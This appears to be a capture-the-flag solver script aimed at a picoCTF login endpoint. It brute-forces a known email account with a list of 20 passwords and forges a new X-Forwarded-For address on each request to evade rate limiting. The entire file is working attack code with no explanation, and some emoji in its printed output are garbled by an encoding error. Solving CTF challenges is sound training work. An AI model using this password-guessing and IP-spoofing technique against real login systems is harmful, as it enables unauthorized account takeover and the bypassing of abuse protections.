import requests
import time

# Target URL
url = "http://amiable-citadel.picoctf.net:57483/login"

# Known email
email = "ctf-player@picoctf.org"

# Password list (your 20 passwords)
passwords = [
    "tkY83OwR", "vISQRFmM", "471HtPne", "s8nXfR6X", "WoQEk5GL",
    "eu8z9EFn", "0SMi2c8U", "WlHiKuw6", "0iaXgUGR", "shNKoNrW",
    "KaqwDEUA", "eSqOLef7", "CueFICmh", "MZZSJucZ", "eZQR9yx7",
    "sPEIun6X", "p0fkX9cA", "CY1sEmC6", "M707m17w", "8thnKYYn"
]

print("Attempting to bypass rate limiting and find the correct password...")

for i, password in enumerate(passwords):
    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": f"10.0.{i//256}.{i%256}"  # Use different IP for each attempt
    }
    
    data = {
        "email": email,
        "password": password
    }
    
    try:
        response = requests.post(url, json=data, headers=headers)
        
        # Parse the JSON response
        response_data = response.json()
        
        print(f"Attempt {i+1}: {password} - Status: {response.status_code}")
        
        # Check if login was truly successful
        if response_data.get('success') == True:
            print(f"\nðŸŽ‰ SUCCESS! Correct password found: {password}")
            print(f"Full response: {response_data}")
            if 'flag' in response_data:
                print(f"\nðŸš© FLAG: {response_data['flag']}")
            break
        else:
            if response_data.get('error'):
                print(f"  â†³ Error: {response_data['error']}")
            else:
                print(f"  â†³ Login failed (success: {response_data.get('success')})")
    
    except Exception as e:
        print(f"Error: {e}")
    
    # Small delay to be polite
    time.sleep(0.5)